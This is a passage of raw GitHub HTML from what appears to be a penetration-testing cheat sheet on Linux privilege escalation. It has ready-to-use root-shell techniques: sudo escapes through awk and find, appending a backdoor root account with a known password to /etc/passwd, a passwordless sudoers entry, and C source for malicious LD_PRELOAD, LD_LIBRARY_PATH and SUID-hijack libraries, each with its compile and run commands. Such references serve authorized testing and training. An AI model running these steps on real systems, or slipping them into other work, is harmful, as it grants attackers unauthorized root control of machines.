class=\"pl-k\"\u003edone\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAlso check out \u003ca href=\"https://github.com/DominicBreuker/pspy\"\u003epspy\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.2 Linux Privilege Escalation\u003c/h2\u003e\u003ca id=\"user-content-62-linux-privilege-escalation\" class=\"anchor\" aria-label=\"Permalink: 6.2 Linux Privilege Escalation\" href=\"#62-linux-privilege-escalation\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSo many options:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md\"\u003ePayloadsAllTheThings - Linux Privesc\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://book.hacktricks.xyz/linux-hardening/privilege-escalation\" rel=\"nofollow\"\u003eHackTricks - Linux Privesc\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.2.1 Abusing \u003ccode\u003esudo\u003c/code\u003e\u003c/h3\u003e\u003ca id=\"user-content-621-abusing-sudo\" class=\"anchor\" aria-label=\"Permalink: 6.2.1 Abusing sudo\" href=\"#621-abusing-sudo\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://gtfobins.github.io/#+sudo\" rel=\"nofollow\"\u003eMany binaries\u003c/a\u003e let you run commands from within them. If you get limited \u003ccode\u003esudo\u003c/code\u003e\npermissions for one of the binaries, you can escalate to root.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e \u003cstrong\u003eNOTE\u003c/strong\u003e: If you get \"Permission denied\" error, check \u003ccode\u003e/var/log/syslog\u003c/code\u003e to see if the \u003ccode\u003eaudit\u003c/code\u003e daemon is blocking you with \u003ccode\u003eAppArmor\u003c/code\u003e (enabled by default on Debian 10).\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# check for sudo permissions\nsudo -l\n# if you see a binary with '(root) NOPASSWD ...' you might be in luck\n# check the following website for escalation methods:\n# https://gtfobins.github.io/#+sudo\n\n# Example: awk\nsudo awk 'BEGIN {system(\u0026quot;/bin/sh\u0026quot;)}'\n\n# Example: find\nsudo find . -exec /bin/sh \\; -quit\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check for sudo permissions\u003c/span\u003e\nsudo -l\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you see a binary with '(root) NOPASSWD ...' you might be in luck\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check the following website for escalation methods:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e https://gtfobins.github.io/#+sudo\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Example: awk\u003c/span\u003e\nsudo awk \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eBEGIN {system(\"/bin/sh\")}\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Example: find\u003c/span\u003e\nsudo find \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e -exec /bin/sh \u003cspan class=\"pl-cce\"\u003e\\;\u003c/span\u003e -quit\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.2.2 Adding root user to /etc/shadow or /etc/passwd\u003c/h3\u003e\u003ca id=\"user-content-622-adding-root-user-to-etcshadow-or-etcpasswd\" class=\"anchor\" aria-label=\"Permalink: 6.2.2 Adding root user to /etc/shadow or /etc/passwd\" href=\"#622-adding-root-user-to-etcshadow-or-etcpasswd\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# if /etc/shadow is writable\n# generate new password\nopenssl passwd -6 herpderp\n# or\nmkpasswd -m sha-512 herpderp\n# edit /etc/shadow and overwrite hash of root with this one\n\n# if /etc/passwd is writable\necho \u0026quot;derp:$(openssl passwd -6 herpderp):0:0:root:/root:/bin/bash\u0026quot; \u0026gt;\u0026gt; /etc/passwd\n# alternatively\necho \u0026quot;derp:$(mkpasswd -m sha-512 herpderp):0:0:root:/root:/bin/bash\u0026quot; \u0026gt;\u0026gt; /etc/passwd\n# pre-computed for password 'herpderp':\necho 'derp:$5$herpderp$pkbOJ3TJ8UP4oCW0.B5bzt3vNeHCXClgwE2efw60p.6:0:0:root:/root:/bin/bash' \u0026gt;\u0026gt; /etc/passwd\n\n# the empty/blank crypt hash for old Linux systems is U6aMy0wojraho.\n# if you see this in an /etc/passwd (or shadow), the user has no password!\n\n# can also add generated password between the first and second colon of root user\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if /etc/shadow is writable\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e generate new password\u003c/span\u003e\nopenssl passwd -6 herpderp\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or\u003c/span\u003e\nmkpasswd -m sha-512 herpderp\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e edit /etc/shadow and overwrite hash of root with this one\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if /etc/passwd is writable\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ederp:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003eopenssl passwd -6 herpderp\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e:0:0:root:/root:/bin/bash\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e /etc/passwd\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e alternatively\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ederp:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003emkpasswd -m sha-512 herpderp\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e:0:0:root:/root:/bin/bash\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e /etc/passwd\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e pre-computed for password 'herpderp':\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ederp:$5$herpderp$pkbOJ3TJ8UP4oCW0.B5bzt3vNeHCXClgwE2efw60p.6:0:0:root:/root:/bin/bash\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e /etc/passwd\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e the empty/blank crypt hash for old Linux systems is U6aMy0wojraho.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you see this in an /etc/passwd (or shadow), the user has no password!\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can also add generated password between the first and second colon of root user\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.2.3 Grant passwordless sudo access\u003c/h3\u003e\u003ca id=\"user-content-623-grant-passwordless-sudo-access\" class=\"anchor\" aria-label=\"Permalink: 6.2.3 Grant passwordless sudo access\" href=\"#623-grant-passwordless-sudo-access\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eEdit the \u003ccode\u003e/etc/sudoers\u003c/code\u003e file to have the following line:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"myuser ALL=(ALL) NOPASSWD: ALL\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003emyuser ALL=(ALL) NOPASSWD: ALL\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.2.4 LD_PRELOAD and LD_LIBRARY_PATH\u003c/h3\u003e\u003ca id=\"user-content-624-ld_preload-and-ld_library_path\" class=\"anchor\" aria-label=\"Permalink: 6.2.4 LD_PRELOAD and LD_LIBRARY_PATH\" href=\"#624-ld_preload-and-ld_library_path\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFor this to work, \u003ccode\u003esudo -l\u003c/code\u003e must show that either LD_PRELOAD or LD_LIBRARY_PATH\nare inherited from the user's environment:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eenv_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ccode\u003epreload.c\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-c notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"#include \u0026lt;stdio.h\u0026gt;\n#include \u0026lt;sys/types.h\u0026gt;\n#include \u0026lt;stdlib.h\u0026gt;\n#define _GNU_SOURCE\n#include \u0026lt;unistd.h\u0026gt;\n\nvoid _init() {\n\tunsetenv(\u0026quot;LD_PRELOAD\u0026quot;);\n\t// setresuid(0,0,0);\n  setuid(0);\n  setgid(0);\n\tsystem(\u0026quot;/bin/bash -p\u0026quot;);\n  exit(0);\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;sys/types.h\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#define\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003e_GNU_SOURCE\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;unistd.h\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-smi\"\u003evoid\u003c/span\u003e \u003cspan class=\"pl-en\"\u003e_init\u003c/span\u003e() {\n\t\u003cspan class=\"pl-en\"\u003eunsetenv\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"LD_PRELOAD\"\u003c/span\u003e);\n\t\u003cspan class=\"pl-c\"\u003e// setresuid(0,0,0);\u003c/span\u003e\n  \u003cspan class=\"pl-en\"\u003esetuid\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e);\n  \u003cspan class=\"pl-en\"\u003esetgid\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e);\n\t\u003cspan class=\"pl-en\"\u003esystem\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"/bin/bash -p\"\u003c/span\u003e);\n  \u003cspan class=\"pl-en\"\u003eexit\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e);\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ccode\u003elibrary_path.c\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-c notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"#include \u0026lt;stdio.h\u0026gt;\n#include \u0026lt;stdlib.h\u0026gt;\n\nstatic void hijack() __attribute__((constructor));\n\nvoid hijack() {\n\tunsetenv(\u0026quot;LD_LIBRARY_PATH\u0026quot;);\n\tsetresuid(0,0,0);\n\tsystem(\u0026quot;/bin/bash -p\u0026quot;);\n  exit(0);\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-k\"\u003estatic\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003evoid\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ehijack\u003c/span\u003e() __attribute__((\u003cspan class=\"pl-s1\"\u003econstructor\u003c/span\u003e));\n\n\u003cspan class=\"pl-smi\"\u003evoid\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ehijack\u003c/span\u003e() {\n\t\u003cspan class=\"pl-en\"\u003eunsetenv\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"LD_LIBRARY_PATH\"\u003c/span\u003e);\n\t\u003cspan class=\"pl-en\"\u003esetresuid\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e,\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e,\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e);\n\t\u003cspan class=\"pl-en\"\u003esystem\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"/bin/bash -p\"\u003c/span\u003e);\n  \u003cspan class=\"pl-en\"\u003eexit\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e);\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUsage:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# LD_PRELOAD\n# compile malicious preload binary\ngcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c\n# use it to get root\nsudo LD_PRELOAD=/tmp/preload.so program_name_here\n\n# LD_LIBRARY_PATH\n# see which shared libraries are used\nldd $(which apache2)\n# compile malicious library as one of existing ones\ngcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c\n# use it to get root\nsudo LD_LIBRARY_PATH=/tmp apache2\n# note, some ld-files work better than others, so try every option from ldd\n# if the first attempt fails. May also need to alter file to hook function\n# being called (must exactly match function signature)\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e LD_PRELOAD\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e compile malicious preload binary\u003c/span\u003e\ngcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use it to get root\u003c/span\u003e\nsudo LD_PRELOAD=/tmp/preload.so program_name_here\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e LD_LIBRARY_PATH\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e see which shared libraries are used\u003c/span\u003e\nldd \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003ewhich apache2\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e compile malicious library as one of existing ones\u003c/span\u003e\ngcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use it to get root\u003c/span\u003e\nsudo LD_LIBRARY_PATH=/tmp apache2\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e note, some ld-files work better than others, so try every option from ldd\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if the first attempt fails. May also need to alter file to hook function\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e being called (must exactly match function signature)\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.2.5 Hijacking SUID binaries\u003c/h3\u003e\u003ca id=\"user-content-625-hijacking-suid-binaries\" class=\"anchor\" aria-label=\"Permalink: 6.2.5 Hijacking SUID binaries\" href=\"#625-hijacking-suid-binaries\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ccode\u003einject.c\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-c notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"#include \u0026lt;stdio.h\u0026gt;\n#include \u0026lt;stdlib.h\u0026gt;\n#include \u0026lt;unistd.h\u0026gt;\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject() {\n\tsetuid(0);\n  setgid(0);\n\tsystem(\u0026quot;/bin/bash -p\u0026quot;);\n  exit(0);\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;unistd.h\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-k\"\u003estatic\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003evoid\u003c/span\u003e \u003cspan class=\"pl-en\"\u003einject\u003c/span\u003e() __attribute__((\u003cspan class=\"pl-s1\"\u003econstructor\u003c/span\u003e));\n\n\u003cspan class=\"pl-smi\"\u003evoid\u003c/span\u003e \u003cspan class=\"pl-en\"\u003einject\u003c/span\u003e() {\n\t\u003cspan class=\"pl-en\"\u003esetuid\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e);\n  \u003cspan class=\"pl-en\"\u003esetgid\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e);\n\t\u003cspan class=\"pl-en\"\u003esystem\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"/bin/bash -p\"\u003c/span\u003e);\n  \u003cspan class=\"pl-en\"\u003eexit\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e);\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# find all root-owned SUID and GUID binaries\nfind / -type f \\( -perm -g+s -a -gid 0 \\) -o \\( -perm -u+s -a -uid 0 \\) -ls 2\u0026gt;/dev/null\n\n# look for access to shared object that doesn't exist, but we might control\nstrace /usr/local/bin/suid-so 2\u0026gt;\u0026amp;1 | grep -iE \u0026quot;open|access|no such file\u0026quot;\n\n# compile your inject file\ngcc -shared -fPIC inject.c -o /path/to/hijacked.so\n\n# run your binary\nsuid-so\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e find all root-owned SUID and GUID binaries\u003c/span\u003e\nfind / -type f \u003cspan class=\"pl-cce\"\u003e\\(\u003c/span\u003e -perm -g+s -a -gid 0 \u003cspan class=\"pl-cce\"\u003e\\)\u003c/span\u003e -o \u003cspan class=\"pl-cce\"\u003e\\(\u003c/span\u003e -perm -u+s -a -uid 0 \u003cspan class=\"pl-cce\"\u003e\\)\u003c/span\u003e -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look for access to shared object that doesn't exist, but we might control\u003c/span\u003e\nstrace /usr/local/bin/suid-so \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u0026amp;1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep -iE \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eopen|access|no such file\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e compile your inject file\u003c/span\u003e\ngcc -shared -fPIC inject.c -o /path/to/hijacked.so\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e run your binary\u003c/span\u003e\nsuid-so\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can also hijack system(3) calls in an executable where the binary path isn't\nspecified (PATH hijack). Look for clues using 